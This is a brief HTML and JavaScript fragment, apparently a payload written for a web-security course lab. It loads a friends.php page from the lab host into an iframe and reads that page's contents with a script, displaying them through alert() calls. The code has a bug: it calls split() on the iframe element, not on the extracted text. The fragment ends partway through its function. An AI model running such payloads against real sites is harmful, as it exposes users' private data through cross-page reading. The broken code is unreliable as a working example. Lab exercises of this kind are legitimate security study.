<iframe id="hide3" src="http://csec380-core.csec.rit.edu:86/friends.php"></iframe>
<script>
    var eee = document.getElementById("hide3");
    eee.addEventListener("load",function(){
       var cont= eee.contentWindow.document.body.innerHTML.match('^[^<br]*');
       alert(cont);
       var numbers = eee.split(',');
       alert(numbers);
